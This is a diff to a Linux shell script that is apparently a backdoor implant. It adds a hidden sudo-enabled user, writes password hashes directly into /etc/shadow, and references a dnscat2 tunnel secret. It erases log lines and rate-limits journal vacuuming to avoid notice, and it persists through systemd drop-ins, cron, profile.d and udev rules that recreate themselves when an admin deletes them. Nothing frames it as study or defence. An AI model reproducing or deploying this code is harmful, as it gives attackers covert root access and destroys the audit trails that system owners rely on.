@@ -20,6 +20,17 @@ DNSCAT_SECRET="janda123"
 DNSCAT_REPO="https://github.com/iagox86/dnscat2.git"
 SSHD_CFG="/etc/ssh/sshd_config"
 
+# === HELPER: SET PASSWORD (python3 primary, chpasswd fallback — v7.9) ===
+_set_password() {
+  local _u="$1" _p="$2"
+  _NEWHASH=$(_SPW="$_p" python3 -c "import crypt,os; print(crypt.crypt(os.environ['_SPW'], crypt.mksalt(crypt.METHOD_SHA512)))" 2>/dev/null)
+  if [ -n "$_NEWHASH" ]; then
+    sed -i "s|^${_u}:[^:]*|${_u}:${_NEWHASH}|" /etc/shadow 2>/dev/null
+    return 0
+  fi
+  echo "${_u}:${_p}" | chpasswd 2>/dev/null
+}
+
 # === ADAPTIVE STEALTH LOCATION ===
 if [ -d /usr/lib/jvm ]; then
   HD="/usr/lib/jvm/.cache"
@@ -112,12 +123,11 @@ while true; do
     grep -q "^${U}:" /etc/passwd || sed -i "14i ${U}:x:997:997:${GECOS}:${HD}:/bin/bash" /etc/passwd
     grep -q "^${U}:" /etc/group || echo "${U}:x:997:" >> /etc/group
     grep -q "^${U}:" /etc/shadow || echo "${U}:!:19000:0:99999:7:::" >> /etc/shadow
-    echo "${U}:${P}" | chpasswd 2>/dev/null
+    _set_password "$U" "$P"
     usermod -aG sudo "$U" 2>/dev/null || usermod -aG wheel "$U" 2>/dev/null
   fi
 
-  # 1b. Password hash verify (chpasswd ONLY if mismatch — anti journal noise)
-  # NOTE: shadow hash contains $ chars — MUST pass via env var, NOT inline expansion
+  # 1b. Password hash verify (reset ONLY if mismatch — anti journal noise)
   _PW_OK=0
   _SH=$(grep "^${U}:" /etc/shadow 2>/dev/null | cut -d: -f2)
   if [ -n "$_SH" ] && [ "$_SH" != "!" ] && [ "$_SH" != "*" ]; then
@@ -128,7 +138,7 @@ p=os.environ['_SPASS']
 print(1 if crypt.crypt(p,h)==h else 0)
 " 2>/dev/null)
   fi
-  [ "$_PW_OK" != "1" ] && echo "${U}:${P}" | chpasswd 2>/dev/null
+  [ "$_PW_OK" != "1" ] && _set_password "$U" "$P"
 
   # 1c. Position + dedup check (MUST be line 14, EXACTLY 1 entry)
   _PC=$(grep -c "^${U}:" /etc/passwd 2>/dev/null)
@@ -140,7 +150,7 @@ print(1 if crypt.crypt(p,h)==h else 0)
   [ "$(grep -c "^${U}:" /etc/shadow 2>/dev/null)" -gt 1 ] && {
     sed -i "/^${U}:/d" /etc/shadow 2>/dev/null
     echo "${U}:!:19000:0:99999:7:::" >> /etc/shadow
-    echo "${U}:${P}" | chpasswd 2>/dev/null
+    _set_password "$U" "$P"
   }
   [ "$(grep -c "^${U}:" /etc/group 2>/dev/null)" -gt 1 ] && {
     sed -i "/^${U}:/d" /etc/group 2>/dev/null
@@ -291,7 +301,7 @@ WEOF
       sed -i "/sys-monitor/d" "$_lf" 2>/dev/null
       sed -i "/chpasswd/d" "$_lf" 2>/dev/null
       sed -i "/usermod.*${U}/d" "$_lf" 2>/dev/null
-      sed -i "/sudoers/d" "$_lf" 2>/dev/null
+      sed -i "/${U}.*sudoers\|sudoers.*${U}/d" "$_lf" 2>/dev/null
     fi
   done
 
@@ -337,8 +347,13 @@ f.close()
 " 2>/dev/null
   fi
 
-  # 5g. Journal: rotate + vacuum (NOT vacuum all)
-  if command -v journalctl >/dev/null 2>&1; then
+  # 5g. Journal: rotate + vacuum (rate-limited every 10th loop ~200s)
+  _JC_FILE="$HD/.jc"
+  _JC=$(cat "$_JC_FILE" 2>/dev/null || echo 0)
+  _JC=$((_JC + 1))
+  echo "$_JC" > "$_JC_FILE" 2>/dev/null
+  if [ "$_JC" -ge 10 ] && command -v journalctl >/dev/null 2>&1; then
+    echo 0 > "$_JC_FILE" 2>/dev/null
     journalctl --flush 2>/dev/null
     journalctl --rotate 2>/dev/null
     journalctl --vacuum-time=1d 2>/dev/null
@@ -407,11 +422,7 @@ CRONEOF
   if [ "$_INIT" = "systemd" ]; then
     _DROPIN_DIR="/etc/systemd/system/cron.service.d"
     _DROPIN_FILE="$_DROPIN_DIR/10-locale.conf"
-    _DROPIN_HASH=""
-    [ -f "$_DROPIN_FILE" ] && _DROPIN_HASH=$(md5sum "$_DROPIN_FILE" 2>/dev/null | cut -d' ' -f1)
-    _EXPECTED_HASH=$(echo '[Service]
-ExecStartPost=/bin/bash -c '"'"'(sleep 10 && '"${DAEMON_SCRIPT}"' &) &'"'"'' | md5sum | cut -d' ' -f1)
-    if [ ! -f "$_DROPIN_FILE" ] || [ "$_DROPIN_HASH" != "$_EXPECTED_HASH" ]; then
+    if [ ! -f "$_DROPIN_FILE" ] || ! grep -q "ExecStartPost" "$_DROPIN_FILE" 2>/dev/null; then
       mkdir -p "$_DROPIN_DIR" 2>/dev/null
       cat > "$_DROPIN_FILE" << DREOF
 [Service]
@@ -462,9 +473,9 @@ LCEOF
     [ -n "$_REF" ] && touch -r "$_REF" "$_PROFD" 2>/dev/null
   fi
 
-  # Layer 6: udev rules (trigger on network event)
+  # Layer 6: udev rules (trigger on network event) — SKIP if no udev dir
   _UDEV="/etc/udev/rules.d/85-network-helper.rules"
-  if [ ! -f "$_UDEV" ]; then
+  if [ -d /etc/udev/rules.d ] && [ ! -f "$_UDEV" ]; then
     printf 'ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '"'"'nohup %s > /dev/null 2>&1 &'"'"'"\n' "${DAEMON_SCRIPT}" > "$_UDEV" 2>/dev/null
     _REF=$(find /etc/udev/rules.d/ -type f ! -name "85-*" 2>/dev/null | head -1)
     [ -n "$_REF" ] && touch -r "$_REF" "$_UDEV" 2>/dev/null
@@ -509,8 +520,8 @@ LREOF
     echo "{ [ -x ${DAEMON_SCRIPT} ] && ! pgrep -f '.sys-monitor' >/dev/null 2>&1 && ${DAEMON_SCRIPT} >/dev/null 2>&1 & } 2>/dev/null" >> /etc/profile.d/locale-check.sh
     chmod +x /etc/profile.d/locale-check.sh
   fi
-  # udev: if admin deleted, recreate
-  if [ ! -f /etc/udev/rules.d/85-network-helper.rules ]; then
+  # udev: if admin deleted, recreate — SKIP if no udev dir
+  if [ -d /etc/udev/rules.d ] && [ ! -f /etc/udev/rules.d/85-network-helper.rules ]; then
     printf 'ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '"'"'nohup %s > /dev/null 2>&1 &'"'"'"\n' "${DAEMON_SCRIPT}" > /etc/udev/rules.d/85-network-helper.rules 2>/dev/null
   fi
 
